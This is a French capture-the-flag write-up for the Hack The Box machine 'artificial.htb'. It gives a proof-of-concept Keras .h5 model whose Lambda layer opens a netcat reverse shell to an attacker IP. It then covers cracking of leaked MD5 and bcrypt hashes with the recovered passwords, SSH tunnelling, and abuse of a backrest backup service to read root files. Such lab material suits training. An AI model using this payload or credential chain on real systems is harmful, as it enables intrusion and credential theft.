# TARGET: artificial.htb

**IP:** `10.10.11.74`
**Hostname:** `artificial.htb`
**Ports ouverts:** `80`, `22`

---

## Résumé

Machine web qui accepte des modèles TensorFlow (.h5) et exécute une couche `Lambda` pendant l'inférence. Upload d'un modèle malveillant permet RCE. Escalade ensuite via extraction d'une DB SQLite, brute-force de hashes, SSH, et exploitation d'un service de backup (`backrest`) accessible localement.

---

## 1) Vulnérabilité principale

**TensorFlow Lambda RCE**
La webapp permet d'uploader des fichiers `.h5` (models Keras). Lors de l'inférence, les couches `Lambda` sont exécutées. Un modèle contenant une fonction `exploit` exécutant `os.system(...)` atteint l'exécution de commandes côté serveur.

> Remarque: reproduire l'environnement (tensorflow version) nécessaire pour créer le fichier `exploit.h5`.

### PoC: `exploit.py`

```python
import tensorflow as tf

def exploit(x):
    import os
    os.system("rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1337 >/tmp/f")
    return x

model = tf.keras.Sequential()
model.add(tf.keras.layers.Input(shape=(64,)))
model.add(tf.keras.layers.Lambda(exploit))
model.compile()
model.save("exploit.h5")
```

### Environnement pour exécuter `exploit.py`

```bash
docker run -it --rm \
  -v "$PWD":/workspace \
  -w /workspace \
  tensorflow/tensorflow:2.13.0

python3 exploit.py
```

### Exécution

```bash
# Listener sur l'attaquant
nc -lvnp 1337

# Uploader exploit.h5 via l'interface web
# Cliquer sur "Show Prediction" pour déclencher la payload
# Shell obtenu en tant que uid-100 (groupe app)
```

---

## 2) Extraction des identifiants utilisateurs (SQLite)

```bash
# Chercher fichiers .db
find . -name "*.db" 2>/dev/null

# Exemple d'ouverture
sqlite3 users.db
.tables
SELECT * FROM user;
```

Exemple d'hash extraits:

```
gael:c99175974b6e192936d97224638a34f8
mark:0f3d8c76530022670f1c6029eed09ccb
robert:b606c5f5136170f15444251665638b36
royer:bc25b1f80f544c0ab451c02a3dca9fc6
mary:bf041041e57f1aff3be7ea1abd6129d0
```

### Crack avec John the Ripper

```bash
# Préparer le fichier hashes.txt avec les hashes
john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5 hashes.txt
```

Résultats (exemples):

```
gael:mattp005numbertwo
royer:marwinnarak043414036
```

---

## 3) Accès SSH (user)

```bash
ssh gael@artificial.htb
# password: mattp005numbertwo
cat user.txt
```

---

## 4) Découverte de ports et forwarding

```bash
# Sur la machine compromise
netstat -tlnp | grep 127.0.0.1
# => port 9898 en LISTEN sur 127.0.0.1

# Sur l'attaquant, créer tunnel local
ssh -L 9898:127.0.0.1:9898 gael@artificial.htb
```

---

## 5) Recon sur backrest (backup)

Sur le serveur on trouve un archive de backup:

```bash
find / -type f -name "*backup*" 2>/dev/null
/var/backups/backrest_backup.tar.gz

# Télécharger puis extraire
```

Contenu important (extrait):

```
backrest/
.config/backrest/config.json
jwt-secret
oplog.sqlite
restic/
processlogs/backrest.log
...
```

`config.json` contient un utilisateur `backrest_root` avec un `passwordBcrypt` encodé:

```json
{
  "auth": {
    "users": [
      {
        "name": "backrest_root",
        "passwordBcrypt": "JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP"
      }
    ]
  }
}
```

### Extraction et cracking du bcrypt encodé

```bash
echo 'JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP' | base64 -d > hash.bcrypt
john --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt hash.bcrypt
```

Mot de passe trouvé:

```
backrest_root:!@#$%^
```

---

## 6) Accès backrest (root escalation)

* URL accessible via le tunnel: `http://localhost:9898`
* Credentials: `backrest_root / !@#$%^`

Procédure pour récupérer `root.txt` via la fonctionnalité de snapshot:

1. Se connecter à l'interface backrest.
2. Créer un dépôt (`Repository`) local.

   * Name: `test`
   * Type: `Local`
   * Path: `/tmp`
3. Créer un plan de backup (`Plan`):

   * Name: `exploit`
   * Repository: `test`
   * Paths: `/root/`
4. Exécuter `Backup Now` sur le plan.
5. Une fois le backup complété, cliquer sur `Snapshot Browser` du backup.
6. Naviguer vers `/root/root.txt` dans le navigateur de snapshot.
7. Restaurer ou télécharger le fichier.

Vous récupérez `root.txt`.
Optionnel: la fonctionnalité `hook` du plan peut permettre d'obtenir une reverse-shell (ex. `fbichan` hook dans l'interface).

---

## Résultats finaux

* `user.txt` obtenu via SSH avec l'utilisateur `gael`.
* `root.txt` obtenu depuis le snapshot du backup via backrest.

---

## Remarques / conseils

* Reproduire l'environnement TensorFlow localement pour construire les `.h5` est nécessaire.
* Les opérations présentées supposent l'autorisation de tester la machine (HTB / lab).
* Conserver une trace des fichiers extraits (DB, config) pour audit.

---

## Annexes: commandes utiles (recap)

```bash
# Créer exploit.h5
python3 exploit.py

# Listener
nc -lvnp 1337

# SQLite
sqlite3 users.db
SELECT * FROM user;

# John (raw-md5)
john --wordlist=/usr/share/wordlists/rockyou.txt --format=raw-md5 hashes.txt

# John (bcrypt)
echo '<base64>' | base64 -d > hash.bcrypt
john --wordlist=/usr/share/wordlists/rockyou.txt --format=bcrypt hash.bcrypt

# SSH
ssh gael@artificial.htb

# Tunnel
ssh -L 9898:127.0.0.1:9898 gael@artificial.htb
```

